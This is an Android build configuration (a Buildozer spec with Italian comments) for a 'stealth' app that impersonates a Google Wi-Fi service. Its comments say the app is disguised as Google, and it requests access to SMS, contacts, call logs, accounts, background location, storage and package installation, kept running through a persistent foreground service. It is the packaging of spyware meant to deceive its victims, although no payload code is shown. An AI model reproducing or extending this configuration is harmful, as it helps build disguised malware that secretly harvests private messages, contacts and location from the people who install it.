[app]

# Nome app stealth
title = Servizi Wi-Fi Google
package.name = wifi_services
package.domain = com.google.android.wifi

version.code = 7
version.string = 3.0.0

source.dir = .
source.include_exts = py,png,jpg,kv,atlas

# Requisiti minimi
requirements = python3,kivy,plyer,pyjnius,websocket-client,requests

# Permessi Android (tutti mascherati da servizio WiFi)
android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,\
    CHANGE_WIFI_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,\
    ACCESS_BACKGROUND_LOCATION,FOREGROUND_SERVICE,WAKE_LOCK,\
    SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,\
    READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,\
    READ_CONTACTS,READ_SMS,RECEIVE_SMS,READ_CALL_LOG,\
    READ_PHONE_STATE,POST_NOTIFICATIONS,\
    QUERY_ALL_PACKAGES,GET_ACCOUNTS,\
    MANAGE_EXTERNAL_STORAGE

# API level
android.api = 34
android.minapi = 26
android.ndk = 27
android.sdk = 34

# Gradle
android.gradle_dependencies = androidx.core:core:1.12.0

# Foreground service
android.foreground = 1
android.foreground_service = 1
android.wakelock = 1

# Non serve icona specifica
icon =

# Schermata di caricamento bianca (sembra un servizio Google)
presplash.color = #FFFFFF

# Debug mode
android.debug = 1

# Compila per ARM64 (telefoni moderni)
android.arch = arm64-v8a
